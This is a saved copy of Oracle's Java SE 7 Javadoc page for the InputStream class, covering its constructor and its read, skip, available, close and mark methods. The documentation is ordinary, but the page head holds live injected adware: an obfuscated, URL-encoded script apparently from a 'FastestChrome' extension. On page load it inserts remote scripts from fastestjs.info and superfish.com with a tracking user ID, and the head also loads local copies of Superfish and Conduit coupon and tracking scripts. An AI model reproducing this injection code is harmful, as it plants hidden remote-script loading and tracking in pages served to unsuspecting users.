<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0065)http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<!-- Generated by javadoc (version 1.6.0_18) on Tue Oct 08 07:29:05 PDT 2013 -->
<title>InputStream (Java Platform SE 7 )</title>
<meta name="date" content="2013-10-08">
<meta name="keywords" content="java.io.InputStream class">
<meta name="keywords" content="read()">
<meta name="keywords" content="skip()">
<meta name="keywords" content="available()">
<meta name="keywords" content="close()">
<meta name="keywords" content="mark()">
<meta name="keywords" content="reset()">
<meta name="keywords" content="markSupported()">
<link rel="stylesheet" type="text/css" href="./InputStream (Java Platform SE 7 )_files/stylesheet.css" title="Style">
<style type="text/css"></style><style type="text/css">iframe.dealply-toast { right: -99999px !important; }iframe.dealply-toast.fastestext-revealed { right: 0px !important; margin-bottom: 0px !important; }</style><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/javascript.js"></script><script src="./InputStream (Java Platform SE 7 )_files/opt_background.js"></script><script type="text/javascript" src="data:text/javascript,(function()%7Bvar%20e%3D%22Chrome%20Webstore%22%3B%0Avar%20c%3D%22FastestChrome%22%3B%0Avar%20h%3D%221348146952205%22%3B%0Avar%20f%3D%22false%22%3B%0Avar%20d%3D%221_2012-09%22%3B%0Aif(window!%3Dwindow.top)%7Breturn%0A%7Dvar%20a%3D%5B%2Fveetle.com%2F%2C%2F1800flowers.com%2F%2C%2Fdominos.com%2F%2C%2Fsquidoo.com%2F%2C%2Fnytimes.com%2F%2C%2Fdeveloper.apple.com%2F%2C%2Fhotmail.com%2F%2C%2Fnfl.com%2F%2C%2Fgrooveshark.com%2F%2Cnew%20RegExp(%22www.google.com%2Freader%22)%2C%2Fpandora.com%2F%2C%2Fmerriam-webster.com%2F%2C%2Freddit.com%2F%2C%2Fquora.com%2F%2C%2Ffandango.com%2F%2C%2Fcdixon.org%2F%2C%2Fteslamotors.com%2F%2C%2Fblogspot.co%2F%2C%2Freuters.com%2F%2C%2Fgame321.com%2F%2C%2Fcontinuations.com%2F%2C%2Farstechnica.com%2F%2C%2Fcbslocal.com%2F%2C%2Fvice.com%2F%2C%2Fsealedabstract.com%2F%2C%2Fokcupid.com%2F%2C%2Fnature.com%2F%2C%2Fspotify.com%2F%2C%2Fonline.wsj.com%2F%2C%2Fthermalwindowcurtains.com%2F%2C%2F.*live.com%2F%2C%2F.*battlefield.com%2F%2C%2Fpch.com%2F%5D%3B%0Afor(var%20b%3D0%3B%0Ab%3Ca.length%3B%0Ab%2B%2B)%7Bif(a%5Bb%5D.test(document.location.href))%7Breturn%0A%7D%7Dvar%20j%3Dfunction(l)%7Bvar%20m%3D0%3B%0Afor(var%20k%3D0%3B%0Ak%3Cl.length%3B%0Ak%2B%2B)%7Bm%3D((m%3C%3C5)-m)%2Bl.charCodeAt(k)%3B%0Am%3Dm%26m%0A%7Dreturn%20m%0A%7D%3B%0Avar%20g%3Dfunction(k)%7Bvar%20i%3Dfunction()%7Bif(window.document.body)%7Bk()%0A%7Delse%7BsetTimeout(i%2C100)%0A%7D%7D%3B%0Ai()%0A%7D%3B%0Ag(function()%7BsetTimeout(function()%7Bif(%2F%5Ehttp%3A%2F.test(document.location.href)%7C%7Cnew%20RegExp(%22%5Ehttps%3A%2F%2Fwww.google.com%22).test(document.location.href))%7Bvar%20o%3Dfunction(p)%7Bvar%20q%3Ddocument.createElement(%22script%22)%3B%0Aq.type%3D%22text%2Fjavascript%22%3B%0Aq.src%3Dp%3B%0Adocument.getElementsByTagName(%22head%22)%5B0%5D.appendChild(q)%0A%7D%3B%0Avar%20l%3Dfunction(p)%7Bif(f!%3D%22false%22)%7Bo(%22http%3A%2F%2Fi.fastestjs.info%2Ffast%2Fjavascript.js%3Fchannel%3D%22%2Bp)%0A%7D%7D%3B%0Avar%20n%3Dfunction(p%2Cq)%7Bo(%22https%3A%2F%2Fwww.superfish.com%2Fws%2Fsf_conduit.jsp%3Fdlsource%3D%22%2Bp%2B%22%26CTID%3D%22%2Bq%2B%22%26userId%3Dfastest_000_%22%2Bp%2B%22_%22%2Bq%2B%22_%22)%0A%7D%3B%0Avar%20k%3Dnavigator.browserLanguage%7C%7Cnavigator.language%3B%0Avar%20i%3D%22fastestchrome%22%3B%0Aif(%2FChrome%2F.test(navigator.userAgent))%7Bif(c%3D%3D%22Fastanium%22)%7Bi%3D%22fastanium%22%0A%7Delse%7Bi%3D%22fastestchrome%22%0A%7D%7Delse%7Bif(%2FFirefox%2F.test(navigator.userAgent))%7Bi%3D%22fastestfox%22%0A%7Delse%7Bif(%2FSafari%2F.test(navigator.userAgent))%7Bi%3D%22fastestsafari%22%0A%7Delse%7Bif(%2FTrident%2F.test(navigator.userAgent))%7Bi%3D%22fastestie%22%0A%7D%7D%7D%7Dvar%20m%3DMath.abs(j(h))%3B%0An(i%2Cd)%0A%7D%7D%2C500)%0A%7D)%0A%7D())%3B"></script><script src="./InputStream (Java Platform SE 7 )_files/javascript(1).js"></script><script src="./InputStream (Java Platform SE 7 )_files/opt_content.js"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/sf_conduit.jsp"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/sf_preloader.jsp"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/sf_code.jsp"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/base_single_icon.js"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/dojo.xd.js"></script><script type="text/javascript" charset="utf-8" src="./InputStream (Java Platform SE 7 )_files/script.xd.js"></script><script type="text/javascript" charset="utf-8" src="./InputStream (Java Platform SE 7 )_files/window.xd.js"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/getSupportedSitesJSON.action" id="sufioIoScript1" charset="utf-8"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/getCouponsSupportedSites.action" id="sufioIoScript2" charset="utf-8"></script><script type="text/javascript" src="./InputStream (Java Platform SE 7 )_files/get.jsp"></script><script src="./InputStream (Java Platform SE 7 )_files/ngram_id_dict.json" id="SF_ngram_call" type="text/javascript"></script></head>
<body>
<script type="text/javascript"><!--
    if (location.href.indexOf('is-external=true') == -1) {
        parent.document.title="InputStream (Java Platform SE 7 )";
    }
//-->
</script>
<noscript>
&lt;div&gt;JavaScript is disabled on your browser.&lt;/div&gt;
</noscript>
<!-- ========= START OF TOP NAVBAR ======= -->
<div class="topNav"><a name="navbar_top">
<!--   -->
</a><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#skip-navbar_top" title="Skip navigation links"></a><a name="navbar_top_firstrow">
<!--   -->
</a>
<ul class="navList" title="Navigation">
<li><a href="http://docs.oracle.com/javase/7/docs/api/overview-summary.html">Overview</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/package-summary.html">Package</a></li>
<li class="navBarCell1Rev">Class</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/class-use/InputStream.html">Use</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/package-tree.html">Tree</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/deprecated-list.html">Deprecated</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/index-files/index-1.html">Index</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/help-doc.html">Help</a></li>
</ul>
<div class="aboutLanguage"><em><strong>Java™&nbsp;Platform<br>Standard&nbsp;Ed.&nbsp;7</strong></em></div>
</div>
<div class="subNav">
<ul class="navList">
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Flushable.html" title="interface in java.io"><span class="strong">Prev Class</span></a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStreamReader.html" title="class in java.io"><span class="strong">Next Class</span></a></li>
</ul>
<ul class="navList">
<li><a href="http://docs.oracle.com/javase/7/docs/api/index.html?java/io/InputStream.html" target="_top">Frames</a></li>
<li><a href="./InputStream (Java Platform SE 7 )_files/InputStream (Java Platform SE 7 ).htm" target="_top">No Frames</a></li>
</ul>
<ul class="navList" id="allclasses_navbar_top" style="display: block;">
<li><a href="http://docs.oracle.com/javase/7/docs/api/allclasses-noframe.html">All Classes</a></li>
</ul>
<div>
<script type="text/javascript"><!--
  allClassesLink = document.getElementById("allclasses_navbar_top");
  if(window==top) {
    allClassesLink.style.display = "block";
  }
  else {
    allClassesLink.style.display = "none";
  }
  //-->
</script>
</div>
<div>
<ul class="subNavList">
<li>Summary:&nbsp;</li>
<li>Nested&nbsp;|&nbsp;</li>
<li>Field&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#constructor_summary">Constr</a>&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#method_summary">Method</a></li>
</ul>
<ul class="subNavList">
<li>Detail:&nbsp;</li>
<li>Field&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#constructor_detail">Constr</a>&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#method_detail">Method</a></li>
</ul>
</div>
<a name="skip-navbar_top">
<!--   -->
</a></div>
<!-- ========= END OF TOP NAVBAR ========= -->
<!-- ======== START OF CLASS DATA ======== -->
<div class="header">
<div class="subTitle">java.io</div>
<h2 title="Class InputStream" class="title">Class InputStream</h2>
</div>
<div class="contentContainer">
<ul class="inheritance">
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html" title="class in java.lang">java.lang.Object</a></li>
<li>
<ul class="inheritance">
<li>java.io.InputStream</li>
</ul>
</li>
</ul>
<div class="description">
<ul class="blockList">
<li class="blockList">
<dl>
<dt>All Implemented Interfaces:</dt>
<dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html" title="interface in java.io">Closeable</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html" title="interface in java.lang">AutoCloseable</a></dd>
</dl>
<dl>
<dt>Direct Known Subclasses:</dt>
<dd><a href="http://docs.oracle.com/javase/7/docs/api/javax/sound/sampled/AudioInputStream.html" title="class in javax.sound.sampled">AudioInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/ByteArrayInputStream.html" title="class in java.io">ByteArrayInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/FileInputStream.html" title="class in java.io">FileInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/FilterInputStream.html" title="class in java.io">FilterInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/org/omg/CORBA/portable/InputStream.html" title="class in org.omg.CORBA.portable">InputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html" title="class in java.io">ObjectInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/PipedInputStream.html" title="class in java.io">PipedInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/SequenceInputStream.html" title="class in java.io">SequenceInputStream</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/io/StringBufferInputStream.html" title="class in java.io">StringBufferInputStream</a></dd>
</dl>
<hr>
<br>
<pre>public abstract class <span class="strong">InputStream</span>
extends <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html" title="class in java.lang">Object</a>
implements <a href="http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html" title="interface in java.io">Closeable</a></pre>
<div class="block">This abstract class is the superclass of all classes representing
 an input stream of bytes.

 <p> Applications that need to define a subclass of <code>InputStream</code>
 must always provide a method that returns the next byte of input.</p></div>
<dl><dt><span class="strong">Since:</span></dt>
  <dd>JDK1.0</dd>
<dt><span class="strong">See Also:</span></dt><dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/BufferedInputStream.html" title="class in java.io"><code>BufferedInputStream</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/ByteArrayInputStream.html" title="class in java.io"><code>ByteArrayInputStream</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/DataInputStream.html" title="class in java.io"><code>DataInputStream</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/FilterInputStream.html" title="class in java.io"><code>FilterInputStream</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read()"><code>read()</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/OutputStream.html" title="class in java.io"><code>OutputStream</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/PushbackInputStream.html" title="class in java.io"><code>PushbackInputStream</code></a></dd></dl>
</li>
</ul>
</div>
<div class="summary">
<ul class="blockList">
<li class="blockList">
<!-- ======== CONSTRUCTOR SUMMARY ======== -->
<ul class="blockList">
<li class="blockList"><a name="constructor_summary">
<!--   -->
</a>
<h3>Constructor Summary</h3>
<table class="overviewSummary" border="0" cellpadding="3" cellspacing="0" summary="Constructor Summary table, listing constructors, and an explanation">
<caption><span>Constructors</span><span class="tabEnd">&nbsp;</span></caption>
<tbody><tr>
<th class="colOne" scope="col">Constructor and Description</th>
</tr>
<tr class="altColor">
<td class="colOne"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#InputStream()">InputStream</a></strong>()</code>&nbsp;</td>
</tr>
</tbody></table>
</li>
</ul>
<!-- ========== METHOD SUMMARY =========== -->
<ul class="blockList">
<li class="blockList"><a name="method_summary">
<!--   -->
</a>
<h3>Method Summary</h3>
<table class="overviewSummary" border="0" cellpadding="3" cellspacing="0" summary="Method Summary table, listing methods, and an explanation">
<caption><span>Methods</span><span class="tabEnd">&nbsp;</span></caption>
<tbody><tr>
<th class="colFirst" scope="col">Modifier and Type</th>
<th class="colLast" scope="col">Method and Description</th>
</tr>
<tr class="altColor">
<td class="colFirst"><code>int</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#available()">available</a></strong>()</code>
<div class="block">Returns an estimate of the number of bytes that can be read (or
 skipped over) from this input stream without blocking by the next
 invocation of a method for this input stream.</div>
</td>
</tr>
<tr class="rowColor">
<td class="colFirst"><code>void</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#close()">close</a></strong>()</code>
<div class="block">Closes this input stream and releases any system resources associated
 with the stream.</div>
</td>
</tr>
<tr class="altColor">
<td class="colFirst"><code>void</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#mark(int)">mark</a></strong>(int&nbsp;readlimit)</code>
<div class="block">Marks the current position in this input stream.</div>
</td>
</tr>
<tr class="rowColor">
<td class="colFirst"><code>boolean</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#markSupported()">markSupported</a></strong>()</code>
<div class="block">Tests if this input stream supports the <code>mark</code> and
 <code>reset</code> methods.</div>
</td>
</tr>
<tr class="altColor">
<td class="colFirst"><code>abstract int</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read()">read</a></strong>()</code>
<div class="block">Reads the next byte of data from the input stream.</div>
</td>
</tr>
<tr class="rowColor">
<td class="colFirst"><code>int</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read(byte[])">read</a></strong>(byte[]&nbsp;b)</code>
<div class="block">Reads some number of bytes from the input stream and stores them into
 the buffer array <code>b</code>.</div>
</td>
</tr>
<tr class="altColor">
<td class="colFirst"><code>int</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read(byte[], int, int)">read</a></strong>(byte[]&nbsp;b,
    int&nbsp;off,
    int&nbsp;len)</code>
<div class="block">Reads up to <code>len</code> bytes of data from the input stream into
 an array of bytes.</div>
</td>
</tr>
<tr class="rowColor">
<td class="colFirst"><code>void</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#reset()">reset</a></strong>()</code>
<div class="block">Repositions this stream to the position at the time the
 <code>mark</code> method was last called on this input stream.</div>
</td>
</tr>
<tr class="altColor">
<td class="colFirst"><code>long</code></td>
<td class="colLast"><code><strong><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#skip(long)">skip</a></strong>(long&nbsp;n)</code>
<div class="block">Skips over and discards <code>n</code> bytes of data from this input
 stream.</div>
</td>
</tr>
</tbody></table>
<ul class="blockList">
<li class="blockList"><a name="methods_inherited_from_class_java.lang.Object">
<!--   -->
</a>
<h3>Methods inherited from class&nbsp;java.lang.<a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html" title="class in java.lang">Object</a></h3>
<code><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#clone()">clone</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#equals(java.lang.Object)">equals</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#finalize()">finalize</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#getClass()">getClass</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#hashCode()">hashCode</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#notify()">notify</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#notifyAll()">notifyAll</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#toString()">toString</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#wait()">wait</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#wait(long)">wait</a>, <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#wait(long, int)">wait</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
<div class="details">
<ul class="blockList">
<li class="blockList">
<!-- ========= CONSTRUCTOR DETAIL ======== -->
<ul class="blockList">
<li class="blockList"><a name="constructor_detail">
<!--   -->
</a>
<h3>Constructor Detail</h3>
<a name="InputStream()">
<!--   -->
</a>
<ul class="blockListLast">
<li class="blockList">
<h4>InputStream</h4>
<pre>public&nbsp;InputStream()</pre>
</li>
</ul>
</li>
</ul>
<!-- ============ METHOD DETAIL ========== -->
<ul class="blockList">
<li class="blockList"><a name="method_detail">
<!--   -->
</a>
<h3>Method Detail</h3>
<a name="read()">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>read</h4>
<pre>public abstract&nbsp;int&nbsp;read()
                  throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Reads the next byte of data from the input stream. The value byte is
 returned as an <code>int</code> in the range <code>0</code> to
 <code>255</code>. If no byte is available because the end of the stream
 has been reached, the value <code>-1</code> is returned. This method
 blocks until input data is available, the end of the stream is detected,
 or an exception is thrown.

 <p> A subclass must provide an implementation of this method.</p></div>
<dl><dt><span class="strong">Returns:</span></dt><dd>the next byte of data, or <code>-1</code> if the end of the
             stream is reached.</dd>
<dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - if an I/O error occurs.</dd></dl>
</li>
</ul>
<a name="read(byte[])">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>read</h4>
<pre>public&nbsp;int&nbsp;read(byte[]&nbsp;b)
         throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Reads some number of bytes from the input stream and stores them into
 the buffer array <code>b</code>. The number of bytes actually read is
 returned as an integer.  This method blocks until input data is
 available, end of file is detected, or an exception is thrown.

 <p> If the length of <code>b</code> is zero, then no bytes are read and
 <code>0</code> is returned; otherwise, there is an attempt to read at
 least one byte. If no byte is available because the stream is at the
 end of the file, the value <code>-1</code> is returned; otherwise, at
 least one byte is read and stored into <code>b</code>.

 </p><p> The first byte read is stored into element <code>b[0]</code>, the
 next one into <code>b[1]</code>, and so on. The number of bytes read is,
 at most, equal to the length of <code>b</code>. Let <i>k</i> be the
 number of bytes actually read; these bytes will be stored in elements
 <code>b[0]</code> through <code>b[</code><i>k</i><code>-1]</code>,
 leaving elements <code>b[</code><i>k</i><code>]</code> through
 <code>b[b.length-1]</code> unaffected.

 </p><p> The <code>read(b)</code> method for class <code>InputStream</code>
 has the same effect as: </p><pre><code> read(b, 0, b.length) </code></pre></div>
<dl><dt><span class="strong">Parameters:</span></dt><dd><code>b</code> - the buffer into which the data is read.</dd>
<dt><span class="strong">Returns:</span></dt><dd>the total number of bytes read into the buffer, or
             <code>-1</code> if there is no more data because the end of
             the stream has been reached.</dd>
<dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - If the first byte cannot be read for any reason
 other than the end of the file, if the input stream has been closed, or
 if some other I/O error occurs.</dd>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/NullPointerException.html" title="class in java.lang">NullPointerException</a></code> - if <code>b</code> is <code>null</code>.</dd><dt><span class="strong">See Also:</span></dt><dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read(byte[], int, int)"><code>read(byte[], int, int)</code></a></dd></dl>
</li>
</ul>
<a name="read(byte[], int, int)">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>read</h4>
<pre>public&nbsp;int&nbsp;read(byte[]&nbsp;b,
       int&nbsp;off,
       int&nbsp;len)
         throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Reads up to <code>len</code> bytes of data from the input stream into
 an array of bytes.  An attempt is made to read as many as
 <code>len</code> bytes, but a smaller number may be read.
 The number of bytes actually read is returned as an integer.

 <p> This method blocks until input data is available, end of file is
 detected, or an exception is thrown.

 </p><p> If <code>len</code> is zero, then no bytes are read and
 <code>0</code> is returned; otherwise, there is an attempt to read at
 least one byte. If no byte is available because the stream is at end of
 file, the value <code>-1</code> is returned; otherwise, at least one
 byte is read and stored into <code>b</code>.

 </p><p> The first byte read is stored into element <code>b[off]</code>, the
 next one into <code>b[off+1]</code>, and so on. The number of bytes read
 is, at most, equal to <code>len</code>. Let <i>k</i> be the number of
 bytes actually read; these bytes will be stored in elements
 <code>b[off]</code> through <code>b[off+</code><i>k</i><code>-1]</code>,
 leaving elements <code>b[off+</code><i>k</i><code>]</code> through
 <code>b[off+len-1]</code> unaffected.

 </p><p> In every case, elements <code>b[0]</code> through
 <code>b[off]</code> and elements <code>b[off+len]</code> through
 <code>b[b.length-1]</code> are unaffected.

 </p><p> The <code>read(b,</code> <code>off,</code> <code>len)</code> method
 for class <code>InputStream</code> simply calls the method
 <code>read()</code> repeatedly. If the first such call results in an
 <code>IOException</code>, that exception is returned from the call to
 the <code>read(b,</code> <code>off,</code> <code>len)</code> method.  If
 any subsequent call to <code>read()</code> results in a
 <code>IOException</code>, the exception is caught and treated as if it
 were end of file; the bytes read up to that point are stored into
 <code>b</code> and the number of bytes read before the exception
 occurred is returned. The default implementation of this method blocks
 until the requested amount of input data <code>len</code> has been read,
 end of file is detected, or an exception is thrown. Subclasses are encouraged
 to provide a more efficient implementation of this method.</p></div>
<dl><dt><span class="strong">Parameters:</span></dt><dd><code>b</code> - the buffer into which the data is read.</dd><dd><code>off</code> - the start offset in array <code>b</code>
                   at which the data is written.</dd><dd><code>len</code> - the maximum number of bytes to read.</dd>
<dt><span class="strong">Returns:</span></dt><dd>the total number of bytes read into the buffer, or
             <code>-1</code> if there is no more data because the end of
             the stream has been reached.</dd>
<dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - If the first byte cannot be read for any reason
 other than end of file, or if the input stream has been closed, or if
 some other I/O error occurs.</dd>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/NullPointerException.html" title="class in java.lang">NullPointerException</a></code> - If <code>b</code> is <code>null</code>.</dd>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/IndexOutOfBoundsException.html" title="class in java.lang">IndexOutOfBoundsException</a></code> - If <code>off</code> is negative,
 <code>len</code> is negative, or <code>len</code> is greater than
 <code>b.length - off</code></dd><dt><span class="strong">See Also:</span></dt><dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read()"><code>read()</code></a></dd></dl>
</li>
</ul>
<a name="skip(long)">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>skip</h4>
<pre>public&nbsp;long&nbsp;skip(long&nbsp;n)
          throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Skips over and discards <code>n</code> bytes of data from this input
 stream. The <code>skip</code> method may, for a variety of reasons, end
 up skipping over some smaller number of bytes, possibly <code>0</code>.
 This may result from any of a number of conditions; reaching end of file
 before <code>n</code> bytes have been skipped is only one possibility.
 The actual number of bytes skipped is returned.  If <code>n</code> is
 negative, no bytes are skipped.

 <p> The <code>skip</code> method of this class creates a
 byte array and then repeatedly reads into it until <code>n</code> bytes
 have been read or the end of the stream has been reached. Subclasses are
 encouraged to provide a more efficient implementation of this method.
 For instance, the implementation may depend on the ability to seek.</p></div>
<dl><dt><span class="strong">Parameters:</span></dt><dd><code>n</code> - the number of bytes to be skipped.</dd>
<dt><span class="strong">Returns:</span></dt><dd>the actual number of bytes skipped.</dd>
<dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - if the stream does not support seek,
                          or if some other I/O error occurs.</dd></dl>
</li>
</ul>
<a name="available()">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>available</h4>
<pre>public&nbsp;int&nbsp;available()
              throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Returns an estimate of the number of bytes that can be read (or
 skipped over) from this input stream without blocking by the next
 invocation of a method for this input stream. The next invocation
 might be the same thread or another thread.  A single read or skip of this
 many bytes will not block, but may read or skip fewer bytes.

 <p> Note that while some implementations of <code>InputStream</code> will return
 the total number of bytes in the stream, many will not.  It is
 never correct to use the return value of this method to allocate
 a buffer intended to hold all data in this stream.

 </p><p> A subclass' implementation of this method may choose to throw an
 <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io"><code>IOException</code></a> if this input stream has been closed by
 invoking the <a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#close()"><code>close()</code></a> method.

 </p><p> The <code>available</code> method for class <code>InputStream</code> always
 returns <code>0</code>.

 </p><p> This method should be overridden by subclasses.</p></div>
<dl><dt><span class="strong">Returns:</span></dt><dd>an estimate of the number of bytes that can be read (or skipped
             over) from this input stream without blocking or <code>0</code> when
             it reaches the end of the input stream.</dd>
<dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - if an I/O error occurs.</dd></dl>
</li>
</ul>
<a name="close()">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>close</h4>
<pre>public&nbsp;void&nbsp;close()
           throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Closes this input stream and releases any system resources associated
 with the stream.

 <p> The <code>close</code> method of <code>InputStream</code> does
 nothing.</p></div>
<dl>
<dt><strong>Specified by:</strong></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html#close()">close</a></code>&nbsp;in interface&nbsp;<code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html" title="interface in java.io">Closeable</a></code></dd>
<dt><strong>Specified by:</strong></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html#close()">close</a></code>&nbsp;in interface&nbsp;<code><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html" title="interface in java.lang">AutoCloseable</a></code></dd>
<dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - if an I/O error occurs.</dd></dl>
</li>
</ul>
<a name="mark(int)">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>mark</h4>
<pre>public&nbsp;void&nbsp;mark(int&nbsp;readlimit)</pre>
<div class="block">Marks the current position in this input stream. A subsequent call to
 the <code>reset</code> method repositions this stream at the last marked
 position so that subsequent reads re-read the same bytes.

 <p> The <code>readlimit</code> arguments tells this input stream to
 allow that many bytes to be read before the mark position gets
 invalidated.

 </p><p> The general contract of <code>mark</code> is that, if the method
 <code>markSupported</code> returns <code>true</code>, the stream somehow
 remembers all the bytes read after the call to <code>mark</code> and
 stands ready to supply those same bytes again if and whenever the method
 <code>reset</code> is called.  However, the stream is not required to
 remember any data at all if more than <code>readlimit</code> bytes are
 read from the stream before <code>reset</code> is called.

 </p><p> Marking a closed stream should not have any effect on the stream.

 </p><p> The <code>mark</code> method of <code>InputStream</code> does
 nothing.</p></div>
